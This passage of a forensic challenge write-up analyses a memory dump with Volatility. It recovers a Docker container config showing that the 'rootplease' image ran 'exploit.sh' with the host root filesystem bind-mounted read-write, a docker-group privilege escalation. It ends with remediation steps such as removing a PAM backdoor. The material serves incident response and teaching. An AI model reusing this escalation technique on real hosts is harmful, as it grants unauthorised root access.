</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:25:11 webserver dockerd<span class=o>[</span>16290<span class=o>]</span>: <span class=nv>time</span><span class=o>=</span><span class=s2>&#34;2018-12-27T21:25:11.184923869+01:00&#34;</span> <span class=nv>level</span><span class=o>=</span>error <span class=nv>msg</span><span class=o>=</span><span class=s2>&#34;Download failed, retrying: unexpected EOF&#34;</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:26:34 webserver dockerd<span class=o>[</span>16290<span class=o>]</span>: <span class=nv>time</span><span class=o>=</span><span class=s2>&#34;2018-12-27T21:26:34.788383276+01:00&#34;</span> <span class=nv>level</span><span class=o>=</span>error <span class=nv>msg</span><span class=o>=</span><span class=s2>&#34;Not continuing with pull after error: context canceled&#34;</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:35:33 webserver containerd<span class=o>[</span>16169<span class=o>]</span>: <span class=nv>time</span><span class=o>=</span><span class=s2>&#34;2018-12-27T21:35:33.625364744+01:00&#34;</span> <span class=nv>level</span><span class=o>=</span>info <span class=nv>msg</span><span class=o>=</span><span class=s2>&#34;shim containerd-shim started&#34;</span> <span class=nv>address</span><span class=o>=</span><span class=s2>&#34;/containerd-shim/moby/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/shim.sock&#34;</span> <span class=nv>debug</span><span class=o>=</span><span class=nb>false</span> <span class=nv>pid</span><span class=o>=</span><span class=m>22019</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:38:06 webserver containerd<span class=o>[</span>16169<span class=o>]</span>: <span class=nv>time</span><span class=o>=</span><span class=s2>&#34;2018-12-27T21:38:06.441456597+01:00&#34;</span> <span class=nv>level</span><span class=o>=</span>info <span class=nv>msg</span><span class=o>=</span><span class=s2>&#34;shim reaped&#34;</span> <span class=nv>id</span><span class=o>=</span>7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:38:06 webserver dockerd<span class=o>[</span>16290<span class=o>]</span>: <span class=nv>time</span><span class=o>=</span><span class=s2>&#34;2018-12-27T21:38:06.452409767+01:00&#34;</span> <span class=nv>level</span><span class=o>=</span>info <span class=nv>msg</span><span class=o>=</span><span class=s2>&#34;ignoring event&#34;</span> <span class=nv>module</span><span class=o>=</span>libcontainerd <span class=nv>namespace</span><span class=o>=</span>moby <span class=nv>topic</span><span class=o>=</span>/tasks/delete <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;*events.TaskDelete&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>A container has been created at <code>21:35:33</code> which is identified with:</p><blockquote><p>7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d</p></blockquote><p>It&rsquo;s possible to retrieve this docker&rsquo;s configuration:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat pfile_list<span class=p>|</span> grep <span class=s2>&#34;7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d&#34;</span>
</span></span><span class=line><span class=cl>          <span class=m>541342</span> 0xffff9796a94451a8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
</span></span><span class=line><span class=cl>          <span class=m>541345</span> 0xffff9796a94471e8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/parent
</span></span><span class=line><span class=cl>          <span class=m>541344</span> 0xffff9796a94455d8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/init-id
</span></span><span class=line><span class=cl>          <span class=m>541343</span> 0xffff9796a9445a08 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mount-id
</span></span><span class=line><span class=cl>          <span class=m>541346</span> 0xffff9796a9447a48 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
</span></span><span class=line><span class=cl>          <span class=m>541348</span> 0xffff9796439e5798 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/config.v2.json
</span></span><span class=line><span class=cl>          <span class=m>541349</span> 0xffff9796a9448a88 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostconfig.json
</span></span><span class=line><span class=cl>          <span class=m>541358</span> 0xffff979686544328 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-json.log
</span></span><span class=line><span class=cl>          <span class=m>541356</span> 0xffff9796a9456698 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/secrets
</span></span><span class=line><span class=cl>          <span class=m>541357</span> 0xffff9796a9456268 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/shm
</span></span><span class=line><span class=cl>          <span class=m>541352</span> 0xffff9796a9448658 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostname
</span></span><span class=line><span class=cl>          <span class=m>541355</span> 0xffff9796a9448228 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf.hash
</span></span><span class=line><span class=cl>          <span class=m>541353</span> 0xffff979643985b48 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf
</span></span><span class=line><span class=cl>          <span class=m>541351</span> 0xffff9796a94c87d8 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hosts
</span></span><span class=line><span class=cl>          <span class=m>541347</span> 0xffff9796a9447618 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/checkpoints
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/var/lib/containerd/io.containerd.runtime.v1.linux/moby/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts.mount
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d.mount
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.d
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.requires
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.wants
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts.mount
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d.mount
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.d
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.requires
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.wants
</span></span><span class=line><span class=cl>----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796439e5798 -O configv2.json
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat configv2.json
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>   <span class=s2>&#34;StreamConfig&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=o>}</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;State&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Running&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Paused&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Restarting&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;OOMKilled&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;RemovalInProgress&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Dead&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Pid&#34;</span>:0,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;ExitCode&#34;</span>:0,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Error&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;StartedAt&#34;</span>:<span class=s2>&#34;2018-12-27T20:35:33.829072671Z&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;FinishedAt&#34;</span>:<span class=s2>&#34;2018-12-27T20:38:06.362580759Z&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Health&#34;</span>:null
</span></span><span class=line><span class=cl>   <span class=o>}</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;ID&#34;</span>:<span class=s2>&#34;7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Created&#34;</span>:<span class=s2>&#34;2018-12-27T20:35:33.445274287Z&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Managed&#34;</span>:false,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Path&#34;</span>:<span class=s2>&#34;/bin/bash&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Args&#34;</span>:<span class=o>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;exploit.sh&#34;</span>
</span></span><span class=line><span class=cl>   <span class=o>]</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Config&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Hostname&#34;</span>:<span class=s2>&#34;7a61f3cd00b1&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Domainname&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;User&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;AttachStdin&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;AttachStdout&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;AttachStderr&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Tty&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;OpenStdin&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;StdinOnce&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Env&#34;</span>:<span class=o>[</span>
</span></span><span class=line><span class=cl>         <span class=s2>&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>
</span></span><span class=line><span class=cl>      <span class=o>]</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Cmd&#34;</span>:<span class=o>[</span>
</span></span><span class=line><span class=cl>         <span class=s2>&#34;/bin/bash&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;exploit.sh&#34;</span>
</span></span><span class=line><span class=cl>      <span class=o>]</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Image&#34;</span>:<span class=s2>&#34;chrisfosterelli/rootplease&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Volumes&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;WorkingDir&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Entrypoint&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;OnBuild&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Labels&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=o>}</span>
</span></span><span class=line><span class=cl>   <span class=o>}</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Image&#34;</span>:<span class=s2>&#34;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;NetworkSettings&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Bridge&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;SandboxID&#34;</span>:<span class=s2>&#34;f5255e73e83536c1ef71277f3341fdc91cdcd2bd22f759093140d8aa5eb16891&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;HairpinMode&#34;</span>:false,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;LinkLocalIPv6Address&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;LinkLocalIPv6PrefixLen&#34;</span>:0,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Networks&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>         <span class=s2>&#34;bridge&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IPAMConfig&#34;</span>:null,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Links&#34;</span>:null,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Aliases&#34;</span>:null,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;NetworkID&#34;</span>:<span class=s2>&#34;0f3242d272897a68f74cdf971e44ef9e0e7ad108758cd8b72698327dcbb97343&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;EndpointID&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Gateway&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IPAddress&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IPPrefixLen&#34;</span>:0,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IPv6Gateway&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;GlobalIPv6Address&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;GlobalIPv6PrefixLen&#34;</span>:0,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;MacAddress&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;DriverOpts&#34;</span>:null,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IPAMOperational&#34;</span>:false
</span></span><span class=line><span class=cl>         <span class=o>}</span>
</span></span><span class=line><span class=cl>      <span class=o>}</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Service&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Ports&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;SandboxKey&#34;</span>:<span class=s2>&#34;/var/run/docker/netns/f5255e73e835&#34;</span>,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;SecondaryIPAddresses&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;SecondaryIPv6Addresses&#34;</span>:null,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;IsAnonymousEndpoint&#34;</span>:true,
</span></span><span class=line><span class=cl>      <span class=s2>&#34;HasSwarmEndpoint&#34;</span>:false
</span></span><span class=line><span class=cl>   <span class=o>}</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;LogPath&#34;</span>:<span class=s2>&#34;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-json.log&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Name&#34;</span>:<span class=s2>&#34;/amazing_rosalind&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;Driver&#34;</span>:<span class=s2>&#34;overlay2&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;OS&#34;</span>:<span class=s2>&#34;linux&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;MountLabel&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;ProcessLabel&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;RestartCount&#34;</span>:0,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;HasBeenStartedBefore&#34;</span>:true,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;HasBeenManuallyStopped&#34;</span>:false,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;MountPoints&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;/hostOS&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Source&#34;</span>:<span class=s2>&#34;/&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Destination&#34;</span>:<span class=s2>&#34;/hostOS&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;RW&#34;</span>:true,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Name&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Driver&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Type&#34;</span>:<span class=s2>&#34;bind&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Propagation&#34;</span>:<span class=s2>&#34;rslave&#34;</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;Spec&#34;</span>:<span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Type&#34;</span>:<span class=s2>&#34;bind&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Source&#34;</span>:<span class=s2>&#34;/&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Target&#34;</span>:<span class=s2>&#34;/hostOS&#34;</span>
</span></span><span class=line><span class=cl>         <span class=o>}</span>,
</span></span><span class=line><span class=cl>         <span class=s2>&#34;SkipMountpointCreation&#34;</span>:false
</span></span><span class=line><span class=cl>      <span class=o>}</span>
</span></span><span class=line><span class=cl>   <span class=o>}</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;SecretReferences&#34;</span>:null,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;ConfigReferences&#34;</span>:null,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;AppArmorProfile&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;HostnamePath&#34;</span>:<span class=s2>&#34;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostname&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;HostsPath&#34;</span>:<span class=s2>&#34;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hosts&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;ShmPath&#34;</span>:<span class=s2>&#34;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/shm&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;ResolvConfPath&#34;</span>:<span class=s2>&#34;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;SeccompProfile&#34;</span>:<span class=s2>&#34;&#34;</span>,
</span></span><span class=line><span class=cl>   <span class=s2>&#34;NoNewPrivileges&#34;</span>:false
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>And that&rsquo;s the tragedy, Odie realizes that an unknown docker has been launched:</p><ul><li>Image: chrisfosterelli/rootplease</li><li>Cmd: ["/bin/bash", &ldquo;exploit.sh&rdquo;]</li></ul><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif data-srcset="https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif, https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif 1.5x, https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif title=https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif></p><p>After requesting Google about a possibility of gaining <strong>root</strong> access using docker, we found a dockerhub page that explain how your can abuse <code>docker</code> group: <a href=https://hub.docker.com/r/chrisfosterelli/rootplease/ target=_blank rel="noopener noreffer">https://hub.docker.com/r/chrisfosterelli/rootplease/</a></p><p>Finally, the laziness of using sudo every time he needs to use docker will have gotten the better of our little Odie.</p><h2 id=attack-scenario>Attack scenario</h2><p>According to our analysis, here is the attacker scenario:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png, /lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/scenario_1.png></p><h2 id=action-plan>Action plan</h2><p>Now that we have done a nice analysis, it&rsquo;s important to mitigate and fix vulnerabilities.</p><h3 id=remediation>Remediation</h3><ul><li>Remove or move <code>/var/www/html/test.php</code> and <code>/var/www/html/config_test.php</code> files ;</li><li>Removing <strong>odie</strong> from <code>docker</code> group ;</li><li>Removing the PAM backdoor of Monique and restore the legit PAM mechanism ;</li><li>Remove old SSH key pair and generate new SSH keys for <strong>odie</strong> ;</li><li>Add a password on MySQL user <strong>wp_mysql_user</strong> ;</li><li>Allow <strong>wp_mysql_user</strong> to manage only the WordPress database.</li></ul><h3 id=improvement>Improvement</h3><ul><li>Deport logs to avoid their deletion (voluntary or not). Odie is a good student, he listened to all his courses on Splunk. It will be easy for him ;</li><li>Enable Apache2 POST requests logging ;</li><li>Store 